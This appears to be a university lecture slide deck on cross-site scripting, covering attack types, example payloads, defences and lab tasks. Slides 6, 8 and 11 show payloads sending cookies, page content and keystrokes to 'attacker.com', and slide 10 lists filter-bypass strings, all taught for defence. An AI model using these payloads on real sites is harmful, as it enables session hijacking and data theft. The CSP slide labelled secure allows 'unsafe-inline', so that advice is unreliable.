<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Session 5: WEB-XSS-01 - Cross-Site Scripting</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/reveal.js@4.3.1/dist/reveal.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/reveal.js@4.3.1/dist/theme/white.css">
    <style>
        /* Global slide styling */
        .reveal .slides section {
            text-align: left;
            padding: 20px;
            box-sizing: border-box;
            overflow-y: auto;
            max-height: 100vh;
        }

        .reveal .slides section.center {
            text-align: center;
        }

        /* Ensure content fits within viewport */
        .reveal .slides section h1 {
            font-size: 2.5em;
            margin-bottom: 0.5em;
        }

        .reveal .slides section h2 {
            font-size: 2em;
            margin-bottom: 0.5em;
        }

        .reveal .slides section h3 {
            font-size: 1.5em;
            margin-bottom: 0.5em;
        }

        .reveal .slides section p {
            font-size: 1.1em;
            line-height: 1.4;
            margin-bottom: 0.8em;
        }

        .reveal .slides section ul,
        .reveal .slides section ol {
            font-size: 1em;
            line-height: 1.4;
            margin-bottom: 0.8em;
        }

        .reveal .slides section li {
            margin-bottom: 0.3em;
        }

        /* Task box styling */
        .task-box {
            background: #e3f2fd;
            border: 2px solid #2196f3;
            border-radius: 10px;
            padding: 20px;
            margin: 20px 0;
            max-height: 60vh;
            overflow-y: auto;
        }

        /* Code example styling */
        .code-example {
            background: #f5f5f5;
            border: 1px solid #ddd;
            border-radius: 5px;
            padding: 15px;
            font-family: 'Courier New', monospace;
            margin: 10px 0;
            font-size: 0.9em;
            line-height: 1.3;
            max-height: 40vh;
            overflow-y: auto;
        }

        /* Highlight styling */
        .highlight {
            background: #fff3cd;
            padding: 10px;
            border-radius: 5px;
            border-left: 4px solid #ffc107;
            margin: 10px 0;
        }

        /* Timeline info styling */
        .timeline-info {
            background: #f8f9fa;
            border: 1px solid #dee2e6;
            border-radius: 8px;
            padding: 15px;
            margin: 20px 0;
            font-size: 0.9em;
        }

        .timeline-info ul {
            margin: 10px 0;
            padding-left: 20px;
        }

        .timeline-info li {
            margin-bottom: 0.2em;
        }

        /* OS³ Studio specific styling */
        .os3-studio {
            background: #e3f2fd;
            border: 2px solid #2196f3;
            border-radius: 10px;
            padding: 20px;
            margin: 20px 0;
            max-height: 60vh;
            overflow-y: auto;
        }

        /* Vulnerability examples */
        .vulnerability {
            background: #ffebee;
            border: 2px solid #f44336;
            border-radius: 10px;
            padding: 20px;
            margin: 20px 0;
            max-height: 60vh;
            overflow-y: auto;
        }

        /* Career focus styling */
        .career-box {
            background: #f0f8ff;
            border: 2px solid #007bff;
            border-radius: 10px;
            padding: 20px;
            margin: 20px 0;
            max-height: 60vh;
            overflow-y: auto;
        }

        /* Demo links styling */
        .demo-link {
            background: #fff3cd;
            border: 2px solid #ffc107;
            border-radius: 10px;
            padding: 20px;
            margin: 20px 0;
            max-height: 60vh;
            overflow-y: auto;
        }

        /* Responsive design */
        @media (max-width: 768px) {
            .reveal .slides section {
                padding: 15px;
            }

            .reveal .slides section h1 {
                font-size: 2em;
            }

            .reveal .slides section h2 {
                font-size: 1.6em;
            }

            .reveal .slides section h3 {
                font-size: 1.3em;
            }

            .task-box,
            .code-example {
                font-size: 0.9em;
                padding: 15px;
            }
        }

        /* Custom scrollbar for better UX */
        .reveal .slides section::-webkit-scrollbar,
        .task-box::-webkit-scrollbar,
        .code-example::-webkit-scrollbar {
            width: 8px;
        }

        .reveal .slides section::-webkit-scrollbar-track,
        .task-box::-webkit-scrollbar-track,
        .code-example::-webkit-scrollbar-track {
            background: #f1f1f1;
            border-radius: 4px;
        }

        .reveal .slides section::-webkit-scrollbar-thumb,
        .task-box::-webkit-scrollbar-thumb,
        .code-example::-webkit-scrollbar-thumb {
            background: #888;
            border-radius: 4px;
        }

        .reveal .slides section::-webkit-scrollbar-thumb:hover,
        .task-box::-webkit-scrollbar-thumb:hover,
        .code-example::-webkit-scrollbar-thumb:hover {
            background: #555;
        }

        /* Interactive content styling */
        .interactive-content {
            margin-top: 20px;
            text-align: center;
        }

        .interactive-content h3 {
            color: #2196f3;
            margin-bottom: 15px;
            font-size: 1.3em;
        }

        .video-container,
        .codepen-container {
            position: relative;
            width: 100%;
            max-width: 560px;
            margin: 0 auto;
        }

        .video-container iframe,
        .codepen-container iframe {
            border-radius: 10px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
            transition: transform 0.3s ease;
        }

        .video-container iframe:hover,
        .codepen-container iframe:hover {
            transform: scale(1.02);
        }

        .interactive-description {
            font-size: 0.9em;
            color: #666;
            margin-top: 10px;
            font-style: italic;
        }
    </style>
</head>

<body>
    <div style="position: fixed; top: 20px; left: 20px; z-index: 1000;">
        <a href="../index.html" style="
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                color: white;
                padding: 12px 20px;
                border-radius: 25px;
                text-decoration: none;
                font-weight: 600;
                font-size: 14px;
                box-shadow: 0 4px 15px rgba(102, 126, 234, 0.3);
                transition: all 0.3s ease;
                display: inline-block;
            "
            onmouseover="this.style.transform='translateY(-2px)'; this.style.boxShadow='0 6px 20px rgba(102, 126, 234, 0.4)'"
            onmouseout="this.style.transform='translateY(0)'; this.style.boxShadow='0 4px 15px rgba(102, 126, 234, 0.3)'">
            ← Back to Module
        </a>
    </div>
    <div class="reveal">
        <div class="slides">
            <!-- Slide 1: Title -->
            <section class="center">
                <h1>WEB-XSS-01</h1>
                <h2>Cross-Site Scripting</h2>
                <h3>CMU540: Cyber Security - Session 5</h3>
                <p><strong>Birmingham Newman University</strong></p>
                <p><em>Lecturer: James Williams</em></p>
                <p>Understanding XSS vulnerabilities and client-side security</p>
                <p><small>3-hour session • 30 slides • 2 interactive tasks</small></p>
                <div class="timeline-info">
                    <p><strong>Session Timeline:</strong></p>
                    <ul>
                        <li>10 min: Registration & waiting</li>
                        <li>20 min: Opening slides</li>
                        <li>45 min: Task 1</li>
                        <li>15 min: Break/Catch up</li>
                        <li>20 min: Secondary slides</li>
                        <li>45 min: Task 2</li>
                        <li>Remaining: Self-study</li>
                    </ul>
                </div>
            </section>

            <!-- Slide 2: Learning Objectives -->
            <section>
                <h2>Learning Objectives</h2>
                <ul>
                    <li>Understand OWASP A03: Cross-Site Scripting (XSS)</li>
                    <li>Identify different types of XSS vulnerabilities</li>
                    <li>Learn client-side security best practices</li>
                    <li>Practice vulnerability discovery using OS³ Studio</li>
                    <li>Implement secure XSS prevention measures</li>
                    <li>Explore career opportunities in web security</li>
                </ul>
            </section>

            <!-- Slide 3: OWASP A03 Overview -->
            <section>
                <h2>OWASP A03: Cross-Site Scripting (XSS)</h2>
                <div class="highlight">
                    <p><strong>Definition:</strong> XSS occurs when malicious scripts are injected into web applications and executed in users' browsers.</p>
                </div>
                <h3>Types of XSS:</h3>
                <ul>
                    <li>Reflected XSS (Non-persistent)</li>
                    <li>Stored XSS (Persistent)</li>
                    <li>DOM-based XSS</li>
                    <li>Blind XSS</li>
                </ul>
            </section>

            <!-- Slide 4: Real-World Impact -->
            <section>
                <h2>Real-World Impact</h2>
                <div class="vulnerability">
                    <h3>Notable XSS Attacks:</h3>
                    <ul>
                        <li><strong>Samy Worm (2005):</strong> MySpace XSS worm infected 1 million users</li>
                        <li><strong>PayPal (2010):</strong> Stored XSS in payment pages</li>
                        <li><strong>Facebook (2011):</strong> XSS vulnerability exposed user data</li>
                    </ul>
                    <p><strong>Impact:</strong> Session hijacking, data theft, malware distribution, phishing</p>
                </div>
            </section>

            <!-- Slide 5: Reflected XSS -->
            <section>
                <h2>Reflected XSS (Non-Persistent)</h2>
                <h3>Attack Scenario:</h3>
                <div class="code-example">
&lt;!-- VULNERABLE: Reflected XSS --&gt;<br>
&lt;div&gt;Search results for: &lt;?php echo $_GET['q']; ?&gt;&lt;/div&gt;<br><br>
&lt;!-- Malicious URL --&gt;<br>
https://example.com/search?q=&lt;script&gt;alert('XSS')&lt;/script&gt;<br><br>
&lt;!-- Result --&gt;<br>
&lt;div&gt;Search results for: &lt;script&gt;alert('XSS')&lt;/script&gt;&lt;/div&gt;
                </div>
                <div class="highlight">
                    <p><strong>Characteristics:</strong> Script is reflected immediately, not stored</p>
                </div>
            </section>

            <!-- Slide 6: Stored XSS -->
            <section>
                <h2>Stored XSS (Persistent)</h2>
                <h3>Attack Scenario:</h3>
                <div class="code-example">
&lt;!-- VULNERABLE: Stored XSS --&gt;<br>
&lt;div class="comment"&gt;&lt;?php echo $comment['text']; ?&gt;&lt;/div&gt;<br><br>
&lt;!-- Malicious comment --&gt;<br>
&lt;script&gt;document.location='http://attacker.com/steal.php?cookie='+document.cookie&lt;/script&gt;<br><br>
&lt;!-- Result: Executed for every visitor --&gt;<br>
&lt;div class="comment"&gt;&lt;script&gt;document.location='http://attacker.com/steal.php?cookie='+document.cookie&lt;/script&gt;&lt;/div&gt;
                </div>
                <div class="vulnerability">
                    <p><strong>Characteristics:</strong> Script is stored and executed for all visitors</p>
                </div>
            </section>

            <!-- Slide 7: DOM-based XSS -->
            <section>
                <h2>DOM-based XSS</h2>
                <h3>Attack Scenario:</h3>
                <div class="code-example">
&lt;!-- VULNERABLE: DOM-based XSS --&gt;<br>
&lt;script&gt;<br>
&nbsp;&nbsp;var hash = location.hash.substring(1);<br>
&nbsp;&nbsp;document.getElementById('content').innerHTML = hash;<br>
&lt;/script&gt;<br><br>
&lt;!-- Malicious URL --&gt;<br>
https://example.com/page#&lt;img src=x onerror=alert('XSS')&gt;<br><br>
&lt;!-- Result: Script executed via DOM manipulation --&gt;
                </div>
                <div class="highlight">
                    <p><strong>Characteristics:</strong> Vulnerability exists in client-side JavaScript</p>
                </div>
            </section>

            <!-- Slide 8: Blind XSS -->
            <section>
                <h2>Blind XSS</h2>
                <h3>Attack Scenario:</h3>
                <div class="code-example">
&lt;!-- VULNERABLE: Blind XSS --&gt;<br>
&lt;!-- Admin panel logs user input --&gt;<br>
&lt;div class="log-entry"&gt;&lt;?php echo $log['user_input']; ?&gt;&lt;/div&gt;<br><br>
&lt;!-- Malicious payload in user profile --&gt;<br>
&lt;script&gt;fetch('http://attacker.com/steal?data='+document.body.innerHTML)&lt;/script&gt;<br><br>
&lt;!-- Result: Executed when admin views logs --&gt;
                </div>
                <div class="vulnerability">
                    <p><strong>Characteristics:</strong> Script executes in a different context (admin panel)</p>
                </div>
            </section>

            <!-- Slide 9: XSS Attack Vectors -->
            <section>
                <h2>Common XSS Attack Vectors</h2>
                <h3>1. Basic Script Injection</h3>
                <div class="code-example">
&lt;script&gt;alert('XSS')&lt;/script&gt;<br>
&lt;img src=x onerror=alert('XSS')&gt;<br>
&lt;svg onload=alert('XSS')&gt;&lt;/svg&gt;<br>
&lt;iframe src="javascript:alert('XSS')"&gt;&lt;/iframe&gt;
                </div>
                <h3>2. Event Handlers</h3>
                <div class="code-example">
&lt;div onmouseover="alert('XSS')"&gt;Hover me&lt;/div&gt;<br>
&lt;input onfocus="alert('XSS')"&gt;<br>
&lt;body onload="alert('XSS')"&gt;
                </div>
            </section>

            <!-- Slide 10: Advanced XSS Techniques -->
            <section>
                <h2>Advanced XSS Techniques</h2>
                <h3>1. Bypassing Filters</h3>
                <div class="code-example">
&lt;!-- Case variation --&gt;<br>
&lt;ScRiPt&gt;alert('XSS')&lt;/ScRiPt&gt;<br><br>
&lt;!-- Encoding --&gt;<br>
&lt;script&gt;alert(String.fromCharCode(88,83,83))&lt;/script&gt;<br><br>
&lt;!-- Alternative syntax --&gt;<br>
&lt;script&gt;alert`XSS`&lt;/script&gt;
                </div>
                <h3>2. Context-Aware Payloads</h3>
                <div class="code-example">
&lt;!-- Inside HTML attribute --&gt;<br>
&lt;input value="&quot;&gt;&lt;script&gt;alert('XSS')&lt;/script&gt;"&gt;<br><br>
&lt;!-- Inside JavaScript --&gt;<br>
&lt;script&gt;var name = '&lt;/script&gt;&lt;script&gt;alert('XSS')&lt;/script&gt;';&lt;/script&gt;
                </div>
            </section>

            <!-- Slide 11: XSS Impact -->
            <section>
                <h2>XSS Attack Impact</h2>
                <h3>1. Session Hijacking</h3>
                <div class="code-example">
&lt;script&gt;<br>
&nbsp;&nbsp;var img = new Image();<br>
&nbsp;&nbsp;img.src = 'http://attacker.com/steal.php?cookie=' + document.cookie;<br>
&lt;/script&gt;
                </div>
                <h3>2. Keylogger</h3>
                <div class="code-example">
&lt;script&gt;<br>
&nbsp;&nbsp;document.addEventListener('keypress', function(e) {<br>
&nbsp;&nbsp;&nbsp;&nbsp;fetch('http://attacker.com/log?key=' + e.key);<br>
&nbsp;&nbsp;});<br>
&lt;/script&gt;
                </div>
            </section>

            <!-- Slide 12: Career Opportunities -->
            <section>
                <h2>Career Opportunities in Web Security</h2>
                <div class="career-box">
                    <h3>Web Security Roles:</h3>
                    <ul>
                        <li><strong>Web Application Security Engineer:</strong> £45,000 - £90,000</li>
                        <li><strong>Frontend Security Specialist:</strong> £40,000 - £80,000</li>
                        <li><strong>Penetration Tester:</strong> £35,000 - £70,000</li>
                        <li><strong>Security Consultant:</strong> £50,000 - £100,000</li>
                        <li><strong>Bug Bounty Hunter:</strong> £30,000 - £150,000+</li>
                    </ul>
                    <p><strong>Skills Needed:</strong> JavaScript, HTML/CSS, Web security, Penetration testing</p>
                </div>
            </section>

            <!-- Slide 13: Industry Certifications -->
            <section>
                <h2>Industry Certifications</h2>
                <h3>Web Security Certifications:</h3>
                <ul>
                    <li><strong>OSWE:</strong> Offensive Security Web Expert</li>
                    <li><strong>GWAPT:</strong> GIAC Web Application Penetration Tester</li>
                    <li><strong>CEH:</strong> Certified Ethical Hacker</li>
                    <li><strong>OSCP:</strong> Offensive Security Certified Professional</li>
                    <li><strong>CISSP:</strong> Certified Information Systems Security Professional</li>
                </ul>
                <div class="demo-link">
                    <p><strong>Resources:</strong> <a href="https://www.offensive-security.com/" target="_blank">Offensive Security</a> | <a href="https://www.giac.org/" target="_blank">GIAC</a></p>
                </div>
            </section>

            <!-- Slide 14: OS³ Studio Introduction -->
            <section>
                <h2>OS³ Newman Cyber Security Lab</h2>
                <div class="os3-studio">
                    <h3>WEB-XSS-01 Lab Environment</h3>
                    <p>Our OS³ Studio provides hands-on experience with:</p>
                    <ul>
                        <li>Vulnerable web applications with XSS flaws</li>
                        <li>Real-world attack scenarios and techniques</li>
                        <li>Secure implementation challenges</li>
                        <li>Client-side security best practices</li>
                    </ul>
                    <p><strong>Access:</strong> Available through university portal</p>
                </div>
            </section>

            <!-- Slide 15: Practical Examples -->
            <section>
                <h2>Practical Examples</h2>
                <div class="interactive-content">
                    <h3>Watch: XSS Vulnerabilities Explained</h3>
                    <div class="video-notice" style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 30px; border-radius: 12px; text-align: center; margin: 20px 0;"><p style="margin: 0; font-size: 1.1em;">See Moodle for supporting materials.</p></div>
                    <p class="interactive-description">
                        Understanding real-world XSS vulnerabilities and attack techniques
                    </p>
                </div>
            </section>

            <!-- Slide 16: Web Demos and Tools -->
            <section>
                <h2>Web Demos and Tools</h2>
                <div class="demo-link">
                    <h3>XSS Testing Tools:</h3>
                    <ul>
                        <li><a href="https://portswigger.net/burp" target="_blank">Burp Suite</a> - Web application security testing</li>
                        <li><a href="https://github.com/OWASP/OWASP-ZAP" target="_blank">OWASP ZAP</a> - Open source web app scanner</li>
                        <li><a href="https://xss-game.appspot.com/" target="_blank">Google XSS Game</a> - Interactive XSS challenges</li>
                        <li><a href="https://prompt.ml/" target="_blank">Prompt.ml</a> - XSS filter evasion challenges</li>
                        <li><a href="https://alf.nu/alert1" target="_blank">Alert(1)</a> - XSS challenge platform</li>
                    </ul>
                </div>
            </section>

            <!-- Slide 17: Case Study -->
            <section>
                <h2>Case Study: Samy Worm</h2>
                <div class="vulnerability">
                    <h3>MySpace XSS Worm (2005)</h3>
                    <ul>
                        <li><strong>Impact:</strong> 1 million users infected in 20 hours</li>
                        <li><strong>Method:</strong> Stored XSS in user profile</li>
                        <li><strong>Payload:</strong> JavaScript worm that self-replicated</li>
                        <li><strong>Result:</strong> MySpace temporarily shut down</li>
                    </ul>
                    <p><strong>Lesson:</strong> XSS can be used to create self-propagating malware</p>
                </div>
            </section>

            <!-- Slide 18: Summary of Vulnerabilities -->
            <section>
                <h2>Summary: Common XSS Vulnerabilities</h2>
                <div class="highlight">
                    <h3>Key Vulnerabilities to Look For:</h3>
                    <ol>
                        <li>Unescaped user input in HTML output</li>
                        <li>Dynamic content without proper encoding</li>
                        <li>JavaScript execution from user input</li>
                        <li>Missing Content Security Policy</li>
                        <li>Insufficient input validation</li>
                        <li>DOM manipulation vulnerabilities</li>
                        <li>Event handler injection</li>
                    </ol>
                </div>
            </section>

            <!-- Task 1: Vulnerability Discovery -->
            <section>
                <h2>Task 1: XSS Vulnerability Discovery</h2>
                <div class="task-box">
                    <h3>Objective:</h3>
                    <p>Use OS³ Studio to identify XSS vulnerabilities in the WEB-XSS-01 lab environment.</p>
                    
                    <h3>Instructions:</h3>
                    <ol>
                        <li>Access the OS³ Studio vulnerable application</li>
                        <li>Test for reflected XSS vulnerabilities</li>
                        <li>Look for stored XSS opportunities</li>
                        <li>Test for DOM-based XSS</li>
                        <li>Try blind XSS techniques</li>
                        <li>Attempt filter bypass methods</li>
                        <li>Document all findings with proof of concept</li>
                        <li>Prepare a vulnerability assessment report</li>
                    </ol>
                    <p><strong>Time:</strong> 45 minutes</p>
                    <p><em>Focus on systematic testing and thorough documentation</em></p>
                </div>
            </section>

            <!-- Slide 19: Break/Catch Up -->
            <section class="center">
                <h2>Break Time</h2>
                <div class="highlight">
                    <h3>15 Minutes</h3>
                    <p>Take a break, ask questions, or catch up on the previous task.</p>
                    <p><em>Next: Secure implementation and Task 2</em></p>
                </div>
            </section>

            <!-- Slide 20: Secure XSS Prevention -->
            <section>
                <h2>Secure XSS Prevention</h2>
                
                <h3>1. Output Encoding</h3>
                <div class="code-example">
&lt;!-- SECURE: HTML encoding --&gt;<br>
&lt;?php echo htmlspecialchars($user_input, ENT_QUOTES, 'UTF-8'); ?&gt;<br><br>
&lt;!-- SECURE: JavaScript encoding --&gt;<br>
&lt;script&gt;<br>
&nbsp;&nbsp;var userData = &lt;?php echo json_encode($user_input); ?&gt;;<br>
&lt;/script&gt;<br><br>
&lt;!-- SECURE: URL encoding --&gt;<br>
&lt;a href="profile.php?id=&lt;?php echo urlencode($user_id); ?&gt;"&gt;Profile&lt;/a&gt;
                </div>

                <h3>2. Input Validation</h3>
                <div class="code-example">
&lt;!-- SECURE: Input validation --&gt;<br>
function validateInput(input) {<br>
&nbsp;&nbsp;if (typeof input !== 'string') return false;<br>
&nbsp;&nbsp;if (input.length > 1000) return false;<br>
&nbsp;&nbsp;// Allow only alphanumeric and safe characters<br>
&nbsp;&nbsp;return /^[a-zA-Z0-9\s.,!?-]+$/.test(input);<br>}
                </div>
            </section>

            <!-- Slide 21: Content Security Policy -->
            <section>
                <h2>Content Security Policy (CSP)</h2>
                
                <h3>1. CSP Implementation</h3>
                <div class="code-example">
&lt;!-- SECURE: CSP header --&gt;<br>
Content-Security-Policy: default-src 'self';<br>
&nbsp;&nbsp;script-src 'self' 'unsafe-inline';<br>
&nbsp;&nbsp;style-src 'self' 'unsafe-inline';<br>
&nbsp;&nbsp;img-src 'self' data: https:;<br>
&nbsp;&nbsp;connect-src 'self';<br>
&nbsp;&nbsp;frame-ancestors 'none';<br>
&nbsp;&nbsp;base-uri 'self';<br>
&nbsp;&nbsp;form-action 'self'
                </div>

                <h3>2. CSP Nonce Implementation</h3>
                <div class="code-example">
&lt;!-- SECURE: CSP with nonce --&gt;<br>
&lt;meta http-equiv="Content-Security-Policy" content="script-src 'nonce-<?php echo $nonce; ?>'"&gt;<br>
&lt;script nonce="&lt;?php echo $nonce; ?&gt;"&gt;<br>
&nbsp;&nbsp;// Only scripts with matching nonce execute<br>
&lt;/script&gt;
                </div>
            </section>

            <!-- Slide 22: Secure JavaScript Practices -->
            <section>
                <h2>Secure JavaScript Practices</h2>
                
                <h3>1. Safe DOM Manipulation</h3>
                <div class="code-example">
&lt;!-- SECURE: Safe DOM manipulation --&gt;<br>
// Good: Use textContent instead of innerHTML<br>
element.textContent = userInput;<br><br>
// Good: Use createElement and appendChild<br>
var div = document.createElement('div');<br>
div.textContent = userInput;<br>
parentElement.appendChild(div);<br><br>
// Bad: innerHTML allows script execution<br>
element.innerHTML = userInput;
                </div>

                <h3>2. Safe Event Handling</h3>
                <div class="code-example">
&lt;!-- SECURE: Event delegation --&gt;<br>
document.addEventListener('click', function(e) {<br>
&nbsp;&nbsp;if (e.target.matches('.safe-button')) {<br>
&nbsp;&nbsp;&nbsp;&nbsp;handleClick(e.target);<br>
&nbsp;&nbsp;}<br>});
                </div>
            </section>

            <!-- Slide 23: HTTP Security Headers -->
            <section>
                <h2>HTTP Security Headers</h2>
                
                <h3>1. XSS Protection Headers</h3>
                <div class="code-example">
&lt;!-- SECURE: XSS protection headers --&gt;<br>
X-XSS-Protection: 1; mode=block<br>
X-Content-Type-Options: nosniff<br>
X-Frame-Options: DENY<br>
Referrer-Policy: strict-origin-when-cross-origin<br>
Permissions-Policy: geolocation=(), microphone=(), camera=()
                </div>

                <h3>2. Implementation</h3>
                <div class="code-example">
&lt;!-- SECURE: Express.js headers --&gt;<br>
app.use((req, res, next) => {<br>
&nbsp;&nbsp;res.setHeader('X-XSS-Protection', '1; mode=block');<br>
&nbsp;&nbsp;res.setHeader('X-Content-Type-Options', 'nosniff');<br>
&nbsp;&nbsp;res.setHeader('X-Frame-Options', 'DENY');<br>
&nbsp;&nbsp;res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');<br>
&nbsp;&nbsp;next();<br>});
                </div>
            </section>

            <!-- Slide 24: Template Security -->
            <section>
                <h2>Template Security</h2>
                
                <h3>1. Safe Template Engines</h3>
                <div class="code-example">
&lt;!-- SECURE: Handlebars auto-escaping --&gt;<br>
&lt;div&gt;{{userInput}}&lt;/div&gt;  &lt;!-- Auto-escaped --&gt;<br>
&lt;div&gt;{{{userInput}}}&lt;/div&gt; &lt;!-- Raw HTML (dangerous) --&gt;<br><br>
&lt;!-- SECURE: Jinja2 auto-escaping --&gt;<br>
&lt;div&gt;{{ user_input }}&lt;/div&gt;  &lt;!-- Auto-escaped --&gt;<br>
&lt;div&gt;{{ user_input|safe }}&lt;/div&gt; &lt;!-- Raw HTML (dangerous) --&gt;
                </div>

                <h3>2. Template Context</h3>
                <ul>
                    <li>Always use auto-escaping templates</li>
                    <li>Avoid raw HTML output</li>
                    <li>Validate template data</li>
                    <li>Use template sandboxing</li>
                </ul>
            </section>

            <!-- Slide 25: Client-Side Security -->
            <section>
                <h2>Client-Side Security</h2>
                
                <h3>1. Safe Data Handling</h3>
                <div class="code-example">
&lt;!-- SECURE: Safe data handling --&gt;<br>
// Good: Validate data on client and server<br>
function displayUserData(data) {<br>
&nbsp;&nbsp;if (!isValidUserData(data)) return;<br>
&nbsp;&nbsp;document.getElementById('user-info').textContent = data.name;<br>}<br><br>
// Bad: Direct DOM manipulation<br>
document.getElementById('user-info').innerHTML = data.name;
                </div>

                <h3>2. Safe API Integration</h3>
                <div class="code-example">
&lt;!-- SECURE: Safe API calls --&gt;<br>
fetch('/api/user-data')<br>
&nbsp;&nbsp;.then(response => response.json())<br>
&nbsp;&nbsp;.then(data => {<br>
&nbsp;&nbsp;&nbsp;&nbsp;if (validateApiData(data)) {<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;displayData(data);<br>
&nbsp;&nbsp;&nbsp;&nbsp;}<br>
&nbsp;&nbsp;})<br>
&nbsp;&nbsp;.catch(error => console.error('API Error:', error));
                </div>
            </section>

            <!-- Slide 26: Testing and Validation -->
            <section>
                <h2>Testing and Validation</h2>
                
                <h3>1. Automated XSS Testing</h3>
                <div class="code-example">
&lt;!-- Security testing tools --&gt;<br>
npm install --save-dev eslint-plugin-security<br>
npm install --save-dev xss<br><br>
// Run security audit<br>
npm audit<br>
eslint --ext .js --plugin security .
                </div>

                <h3>2. Manual Testing Checklist</h3>
                <ul>
                    <li>Test all user input fields</li>
                    <li>Try various XSS payloads</li>
                    <li>Test different contexts (HTML, JS, CSS)</li>
                    <li>Verify CSP implementation</li>
                    <li>Check security headers</li>
                </ul>
            </section>

            <!-- Slide 27: Career Development -->
            <section>
                <h2>Career Development in Web Security</h2>
                <div class="career-box">
                    <h3>Next Steps:</h3>
                    <ul>
                        <li><strong>Advanced Certifications:</strong> OSWE, GWAPT, OSCP</li>
                        <li><strong>Specialized Training:</strong> Frontend security, JavaScript security</li>
                        <li><strong>Hands-on Practice:</strong> CTF competitions, bug bounties</li>
                        <li><strong>Industry Networking:</strong> Security conferences, meetups</li>
                        <li><strong>Research:</strong> New attack techniques, defense methods</li>
                    </ul>
                    <p><strong>Resources:</strong> <a href="https://owasp.org/" target="_blank">OWASP</a> | <a href="https://portswigger.net/" target="_blank">PortSwigger</a> | <a href="https://xss-game.appspot.com/" target="_blank">XSS Game</a></p>
                </div>
            </section>

            <!-- Task 2: Secure Implementation -->
            <section>
                <h2>Task 2: Secure XSS Prevention Implementation</h2>
                <div class="task-box">
                    <h3>Objective:</h3>
                    <p>Use OS³ Studio to implement secure XSS prevention measures and fix the vulnerabilities found in Task 1.</p>
                    
                    <h3>Instructions:</h3>
                    <ol>
                        <li>Access the OS³ Studio secure implementation environment</li>
                        <li>Implement proper output encoding for all user data</li>
                        <li>Add Content Security Policy headers</li>
                        <li>Configure HTTP security headers</li>
                        <li>Replace unsafe DOM manipulation with safe methods</li>
                        <li>Implement input validation and sanitization</li>
                        <li>Test the secure implementation</li>
                        <li>Document the security improvements</li>
                    </ol>
                    <p><strong>Time:</strong> 45 minutes</p>
                    <p><em>Focus on implementing industry-standard XSS prevention</em></p>
                </div>
            </section>

            <!-- Slide 28: Further Activity -->
            <section>
                <h2>Further Activity: Code Inspection</h2>
                <div class="os3-studio">
                    <h3>Advanced Students - Code Analysis:</h3>
                    <p>For students with additional time, explore the source code to understand:</p>
                    <ul>
                        <li>How user input is processed and displayed</li>
                        <li>Template engine configuration and escaping</li>
                        <li>JavaScript security practices</li>
                        <li>HTTP security header implementation</li>
                        <li>CSP policy configuration</li>
                    </ul>
                    <p><strong>Deliverable:</strong> Code review report with XSS prevention recommendations</p>
                </div>
            </section>

            <!-- Slide 29: Summary -->
            <section>
                <h2>Session Summary</h2>
                <div class="highlight">
                    <h3>Key Takeaways:</h3>
                    <ul>
                        <li>XSS is a critical client-side security vulnerability</li>
                        <li>Multiple XSS types exist (reflected, stored, DOM-based, blind)</li>
                        <li>Output encoding and CSP are primary defenses</li>
                        <li>OS³ Studio provides hands-on vulnerability testing</li>
                        <li>Secure implementation requires multiple layers of protection</li>
                        <li>Career opportunities in web security are growing</li>
                    </ul>
                </div>
            </section>

            <!-- Slide 30: Next Steps -->
            <section class="center">
                <h2>Next Steps</h2>
                <div class="timeline-info">
                    <h3>Continue Learning:</h3>
                    <ul>
                        <li>Complete the OS³ Studio tasks</li>
                        <li>Explore additional XSS techniques</li>
                        <li>Practice with security testing tools</li>
                        <li>Consider industry certifications</li>
                        <li>Join cybersecurity communities</li>
                    </ul>
                    <p><strong>Next Session:</strong> WEB-CSRF-01 & WEB-CONFIG-01 - CSRF and Misconfiguration</p>
                </div>
            </section>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/reveal.js@4.3.1/dist/reveal.js"></script>
    <script>
        Reveal.initialize({
            hash: true,
            transition: 'slide',
            transitionSpeed: 'default',
            backgroundTransition: 'fade',
            controls: true,
            progress: true,
            center: false,
            touch: true,
            loop: false,
            rtl: false,
            navigationMode: 'default',
            shuffle: false,
            fragments: true,
            fragmentInURL: false,
            embedded: false,
            help: true,
            showNotes: false,
            autoPlayMedia: false,
            preloadIframes: null,
            autoAnimate: true,
            autoAnimateMatcher: null,
            autoAnimateEasing: 'ease',
            autoAnimateDuration: 1.0,
            autoAnimateUnmatched: true,
            autoSlide: 0,
            autoSlideStoppable: true,
            autoSlideMethod: null,
            defaultTiming: null,
            mouseWheel: false,
            previewLinks: false,
            postMessage: true,
            postMessageEvents: false,
            focusBodyOnPageVisibilityChange: true,
            width: '100%',
            height: '100%',
            margin: 0.04,
            minScale: 0.2,
            maxScale: 2.0,
            disableLayout: false
        });
    </script>
</body>

</html>
